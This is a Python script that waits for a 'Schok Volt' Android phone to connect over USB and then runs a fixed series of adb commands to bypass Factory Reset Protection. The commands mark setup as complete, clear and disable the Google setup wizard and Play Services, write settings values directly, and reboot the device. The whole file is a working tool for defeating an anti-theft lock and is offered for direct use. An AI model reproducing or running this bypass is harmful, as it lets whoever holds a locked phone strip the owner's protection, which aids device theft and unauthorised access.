#!/usr/bin/env python3
"""
🔍 SCHOK VOLT AUTO-MONITOR & BYPASS
Continuously monitors for Schok Volt connection and auto-bypasses
"""

import subprocess
import time
import sys
import re

def progress(msg):
    print(f"[*] {msg}")

def run_adb_command(cmd, timeout=30):
    """Run ADB command with error handling"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.returncode == 0, result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        return False, "", "Timeout"
    except Exception as e:
        return False, "", str(e)

def wait_for_schok_device():
    """Wait continuously for Schok Volt device"""
    progress("🔍 Monitoring for Schok Volt connection...")
    progress("Connect your Schok Volt via USB cable")
    
    while True:
        success, output, _ = run_adb_command("adb devices")
        if success and "device" in output:
            lines = output.split('\n')[1:]
            for line in lines:
                if 'device' in line and line.strip():
                    device_id = line.strip().split('\t')[0]
                    progress(f"🎉 Schok Volt detected: {device_id}")
                    return device_id
        
        # Show waiting status every 10 seconds
        if int(time.time()) % 10 == 0:
            progress("Still waiting for Schok Volt...")
        
        time.sleep(2)

def auto_bypass_schok(device_id):
    """Automatically bypass Schok Volt FRP"""
    progress(f"🚀 Starting auto bypass for {device_id}")
    
    # Restart ADB to ensure clean connection
    progress("Restarting ADB server...")
    run_adb_command("adb kill-server")
    time.sleep(2)
    run_adb_command("adb start-server")
    time.sleep(3)
    
    # Comprehensive bypass commands
    bypass_commands = [
        # Phase 1: Basic setup completion
        "adb shell settings put secure user_setup_complete 1",
        "adb shell settings put global device_provisioned 1",
        "adb shell settings put secure setup_wizard_has_run 1",
        "adb shell settings put secure skip_first_use_hints 1",
        
        # Phase 2: Remove FRP components
        "adb shell pm clear com.google.android.setupwizard",
        "adb shell pm clear com.google.android.gms",
        "adb shell pm disable-user com.google.android.setupwizard",
        "adb shell pm disable-user com.google.android.gms",
        
        # Phase 3: Content provider manipulation
        "adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1",
        "adb shell content insert --uri content://settings/global --bind name:s:device_provisioned --bind value:i:1",
        "adb shell content insert --uri content://settings/secure --bind name:s:setup_wizard_has_run --bind value:i:1",
        
        # Phase 4: Force completion
        "adb shell am broadcast -a android.intent.action.BOOT_COMPLETED",
        "adb shell am start -n com.android.settings/.Settings",
        
        # Phase 5: Final commands
        "adb shell input keyevent KEYCODE_HOME",
        "adb reboot"
    ]
    
    success_count = 0
    total_commands = len(bypass_commands)
    
    for i, cmd in enumerate(bypass_commands, 1):
        progress(f"Command {i}/{total_commands}: {cmd}")
        success, stdout, stderr = run_adb_command(cmd, timeout=60)
        
        if success:
            progress(f"✓ Command {i} succeeded")
            success_count += 1
        else:
            progress(f"✗ Command {i} failed")
            # Try alternative syntax for settings commands
            if "settings put" in cmd:
                alt_cmd = cmd.replace("settings put secure", "settings put global")
                success, _, _ = run_adb_command(alt_cmd)
                if success:
                    progress(f"✓ Alternative command {i} succeeded")
                    success_count += 1
        
        time.sleep(3)
    
    progress(f"Bypass completed: {success_count}/{total_commands} commands successful")
    
    if success_count >= total_commands * 0.5:  # 50% success rate
        progress("🎉🎉🎉 SCHOK VOLT FRP BYPASSED! 🎉🎉🎉")
        progress("Your device will reboot and be accessible!")
        return True
    else:
        progress("❌ Bypass had limited success")
        return False

def main():
    print("=" * 60)
    print("🔍 SCHOK VOLT AUTO-MONITOR & BYPASS")
    print("=" * 60)
    print("\nThis script will:")
    print("✅ Continuously monitor for Schok Volt connection")
    print("✅ Automatically detect when device is connected")
    print("✅ Run complete FRP bypass automatically")
    print("✅ Reboot device to finalize bypass")
    print("\n📱 Connect your Schok Volt now...")
    print("⏹️  Press Ctrl+C to stop monitoring")
    print()
    
    try:
        while True:
            # Wait for device
            device_id = wait_for_schok_device()
            
            # Run bypass
            if auto_bypass_schok(device_id):
                print("\n🎉 BYPASS COMPLETE! Device is now accessible!")
                break
            else:
                print("\n⚠️  Bypass partially successful. Trying again...")
                time.sleep(5)
                
                # Ask if user wants to continue monitoring
                try:
                    choice = input("Continue monitoring for next device? (y/n): ").lower()
                    if choice != 'y':
                        break
                except (EOFError, KeyboardInterrupt):
                    break
    
    except KeyboardInterrupt:
        print("\n\nMonitoring stopped by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")

if __name__ == "__main__":
    main()
